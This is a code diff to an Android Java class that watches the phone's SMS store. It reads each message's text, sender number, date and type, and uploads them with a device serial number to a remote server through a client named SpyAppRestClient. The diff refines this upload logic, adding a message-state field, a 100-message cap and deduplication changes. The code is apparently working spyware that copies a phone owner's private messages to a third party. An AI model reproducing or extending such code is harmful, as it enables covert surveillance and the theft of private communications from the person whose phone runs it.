@@ -4,9 +4,11 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import com.loopj.android.http.AsyncHttpResponseHandler;
+import com.loopj.android.http.LogHandler;
 import com.loopj.android.http.RequestParams;
 import cz.msebera.android.httpclient.Header;
 
@@ -17,12 +19,6 @@ import java.util.*;
  * Created by Natalia on 11.01.2017.
  */
 public class MyObserver extends ContentObserver {
-    boolean network = false;
-    public static ArrayList<String> listAddress = new ArrayList<>();
-    public static ArrayList<String> listTime = new ArrayList<>();
-    public static ArrayList<String> listBody = new ArrayList<>();
-    public static ArrayList<String> listSerialNumber = new ArrayList<>();
-    public static int index = 0;
     public static String serialNr = StartService.serialNr;
     String lastSMS = "";
     long lastDate = 0;
@@ -30,6 +26,7 @@ public class MyObserver extends ContentObserver {
     String smsNumber;
     Cursor cursor;
     int post = 0;
+    boolean getAndUpdate;
 
     private ArrayList<String> listMessageDetailsTemp;
     private ArrayList<String> listNumber;
@@ -41,12 +38,13 @@ public class MyObserver extends ContentObserver {
 
     public MyObserver(Handler handler) {
         super(handler);
-        System.out.println(2);
+//        Log.i(" INFO: ", "2");
         serialNr = StartService.serialNr;
         listMessageDetailsTemp = new ArrayList<>();
         listNumber = new ArrayList<>();
         listDate = new ArrayList<>();
         listPosition = new ArrayList<>();
+        getAndUpdate = false;
         getRequest(url);
         Timer timer = new Timer();
         timer.schedule(new TimerTask() {
@@ -61,6 +59,8 @@ public class MyObserver extends ContentObserver {
     private static final String COLUMN_TYPE = "type";
     private static final int MESSAGE_TYPE_SENT = 2;
 
+    int path;
+
     @Override
     public void onChange(boolean selfChange) {
 //        getAndUpdate();
@@ -68,6 +68,7 @@ public class MyObserver extends ContentObserver {
 //        getAndUpdate();
 //        System.out.println("SERIAL NR: " + serialNr);
         cursor = null;
+        String state;
 
         try {
             cursor = StartService.contentResolver.query(uri, null, null, null, null);
@@ -129,24 +130,20 @@ public class MyObserver extends ContentObserver {
 //                }
 //            }
             if (cursor != null) {
-                if (listPosition.size() != 0) {
+                if (getAndUpdate) {
+                    path = 1;
+                    Log.i("LOG ", "DROGA NR 1");
 
-//                int startPosition = 0;
-//                int x;
                     boolean is;
                     cursor.moveToLast();
                     int lastPosition = cursor.getPosition();
+                    if(lastPosition>100) lastPosition = 100;
                     for (int x = 0; x <= lastPosition; x++) {
                         cursor.moveToPosition(x);
-//                    System.out.println(cursor.getString(cursor.getColumnIndex("_id")));
                         is = false;
-                        System.out.println("LIST POSITION SIZE: " + listPosition.size());
                         for (int i = 0; i < listPosition.size(); i++) {
-//                        System.out.println(listPosition.get(i));
-//                        System.out.println(cursor.getString(cursor.getColumnIndex("_id")));
                             if (cursor.getString(cursor.getColumnIndex("_id")).equals(listPosition.get(i))) {
                                 is = true;
-                                System.out.println("IS TRUE");
                             }
                         }
                         if (!is) {
@@ -154,22 +151,39 @@ public class MyObserver extends ContentObserver {
                             String temp2 = cursor.getString(cursor.getColumnIndex("address"));
                             String temp3 = displayTime(cursor.getString(cursor.getColumnIndex("date")));
                             String position = cursor.getString(cursor.getColumnIndex("_id"));
-                            postRequest(temp2, temp3, temp1, serialNr, position);
+                            state = cursor.getString(cursor.getColumnIndex("type"));
+                            if (smsChecker("Number " + temp2 + ": " + temp1, cursor.getString(cursor.getColumnIndex("date")), path)) {
+                                listMessageDetailsTemp.add(listMessageDetailsTemp.size(), temp1);
+                                listNumber.add(listNumber.size(), temp2);
+                                listDate.add(listDate.size(), temp3);
+                                listPosition.add(listPosition.size(), position);
+                                Log.i("LOG: ", "add cursor nr: " + position + " to database");
+                                postRequest(temp2, temp3, temp1, serialNr, position, state);
+                            }
                         }
                     }
 
                 } else if (cursor.moveToFirst()) {
+                    Log.i("LOG", "DROGA NR 2");
+
+                    path = 2;
                     cursor.moveToFirst();
 
                     smsText = cursor.getString(cursor.getColumnIndex("body"));
                     smsNumber = cursor.getString(cursor.getColumnIndex("address"));
-                    String smsDate = cursor.getString(cursor.getColumnIndex("listDate"));
+                    String smsDate = cursor.getString(cursor.getColumnIndex("date"));
+                    state = cursor.getString(cursor.getColumnIndex("type"));
 
                     post = 0;
-                    if (smsChecker("Number " + smsNumber + ": " + smsText, smsDate)) {
+                    if (smsChecker("Number " + smsNumber + ": " + smsText, smsDate, path)) {
 //                    //save data into database/sd card here
-                        postRequest(smsNumber, displayTime(smsDate), smsText, serialNr, cursor.getString(cursor.getColumnIndex("_id")));
-//
+                        listMessageDetailsTemp.add(listMessageDetailsTemp.size(), smsText);
+                        listNumber.add(listNumber.size(), smsNumber);
+                        listDate.add(listDate.size(), displayTime(smsDate));
+                        listPosition.add(listPosition.size(), cursor.getString(cursor.getColumnIndex("_id")));
+                        Log.i("LOG: ", "add cursor nr: " + cursor.getString(cursor.getColumnIndex("_id")) + " to database");
+                        postRequest(smsNumber, displayTime(smsDate), smsText, serialNr, cursor.getString(cursor.getColumnIndex("_id")), state);
+
                     }
                 }
 //                System.out.println("move to last " + cursor.getPosition());
@@ -202,26 +216,33 @@ public class MyObserver extends ContentObserver {
         }
     }
 
-    public boolean smsChecker(String sms, String date) {
+    public boolean smsChecker(String sms, String date, int path) {
         Long dateLong = Long.parseLong(date);
-        System.out.println("CHECKER");
         boolean flagSMS = true;
-        System.out.println(sms + dateLong);
-        System.out.println(lastSMS + lastDate);
+//        Log.i(" INFO: ", sms + dateLong);
+//        Log.i(" INFO: ", lastSMS + lastDate);
 
-//        Toast.makeText(context, "1 " + sms+dateLong, Toast.LENGTH_LONG).show();
-//        Toast.makeText(context, "2 " + lastSMS+lastDate, Toast.LENGTH_LONG).show();
-
-
-        if (sms.equals(lastSMS) || dateLong < lastDate) {
-            System.out.println("flaga false ");
-            flagSMS = false;
-        } else {
-            System.out.println("ELSE");
-            lastSMS = sms;
-            lastDate = dateLong;
+        if(path==2) {
+            if (sms.equals(lastSMS) || dateLong < lastDate) {
+                Log.i(" INFO: ", "path 2 zostalo juz wyslane ");
+                flagSMS = false;
+            } else {
+                Log.i(" INFO: ", "path 2 wysylamy");
+                lastSMS = sms;
+                lastDate = dateLong;
+            }
         }
-        System.out.println("RETURN");
+
+        if(path==1){
+            if (sms.equals(lastSMS)) {
+                Log.i(" INFO: ", "path 1 zostalo juz wyslane");
+                flagSMS = false;
+            } else {
+                Log.i(" INFO: ", "path 1 wysylamy");
+                lastSMS = sms;
+                lastDate = dateLong;
+            }
+        }
         return flagSMS;
     }
 
@@ -244,9 +265,10 @@ public class MyObserver extends ContentObserver {
                 }
             }
         }
+        getAndUpdate = true;
     }
 
-    public void postRequest(final String number, final String date, final String text, final String serialNumber, final String position) {
+    public void postRequest(final String number, final String date, final String text, final String serialNumber, final String position, final String state) {
 
         post = 1;
         RequestParams params = new RequestParams();
@@ -255,53 +277,18 @@ public class MyObserver extends ContentObserver {
         params.put("text", text);
         params.put("log", serialNumber);
         params.put("position", position);
+        params.put("state", state);
         SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
             @Override
             public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                listMessageDetailsTemp.add(listMessageDetailsTemp.size(), text);
-                listNumber.add(listNumber.size(), number);
-                listDate.add(listDate.size(), date);
-                listPosition.add(listPosition.size(), position);
-
-//                listMessageDetailsTemp.add(listMessageDetailsTemp.size(), text);
-//                System.out.println("LAST IN TEXT LIST IS: " + listMessageDetailsTemp.get(listMessageDetailsTemp.size()-1));
-//                listNumber.add(listNumber.size(), number);
-//                System.out.println("LAST IN NUMBER LIST IS: " + listNumber.get(listNumber.size()-1));
-//                listDate.add(listDate.size(), date);
-//                System.out.println("LAST IN DATE LIST IS: " + listDate.get(listDate.size()-1));
-                System.out.println("ON SUCCESS SMS");
-//                network = true;
-//                if (listAddress.size() > 0) {
-//                    System.out.println("List SMS size != 0");
-//                    for (int i = listAddress.size() - 1; i >= 0; i--) {
-//                        postRequest(listAddress.get(i), listTime.get(i), listBody.get(i), listSerialNumber.get(i));
-//                        System.out.println("take first sms from list");
-//                        if (network) {
-//                            System.out.println("remove taken sms from list");
-//                            listAddress.remove(i);
-//                            listTime.remove(i);
-//                            listBody.remove(i);
-//                            listSerialNumber.remove(i);
-//                            index = index - 1;
-//                        }
-//                    }
-//                }
+                Log.i(" INFO: ", "ON SUCCESS SMS");
             }
 
             @Override
             public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                System.out.println("ON FAILURE SMS");
-//                network = false;
-//
-//                listAddress.add(index, listNumber);
-//                listTime.add(index, listDate);
-//                listBody.add(index, text);
-//                listSerialNumber.add(index, serialNumber);
-//                System.out.println("ADDED SMS TO LIST , SIZE: " + listAddress.size());
-//                index = index + 1;
+                Log.i(" INFO: ", "ON FAILURE SMS");
             }
         });
-//        return network;
     }
 
     private void getRequest(String url) {
